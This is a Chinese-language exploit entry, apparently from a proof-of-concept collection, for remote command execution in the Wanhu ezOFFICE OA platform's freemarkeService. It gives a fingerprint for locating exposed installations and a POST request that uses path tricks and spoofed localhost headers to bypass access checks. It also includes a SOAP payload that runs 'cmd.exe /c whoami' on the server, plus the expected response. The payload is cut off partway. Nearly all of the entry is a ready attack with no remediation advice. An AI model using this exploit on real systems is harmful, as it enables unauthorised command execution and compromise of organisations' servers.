# 万户OAfreemarkeService存在远程命令执行漏洞

- **系统**：万户　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/services/./././freemarkeService HTTP/1.1`
- **关键头**：`X-Remote-Addr: 127.0.0.1`　`X-Remote-IP: 127.0.0.1`　`X-Originating: 127.0.0.1`　`X-Forwarded-For: 127.0.0.1`　`Content-Type: text/xml; charset=utf-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:util="http://utility.template.freemarker"
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soapenv:Header/>
<soapenv:Body>
<util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
<cmd xsi:type="soapenc:string">c:\windows\system32\cmd.exe /c whoami</cmd>
</arguments>
</util:exec>
</soapenv:Body>
</soapenv…（脚本共 610 字，完整版见原文）
```
- **预期**：200　|　<?xml version=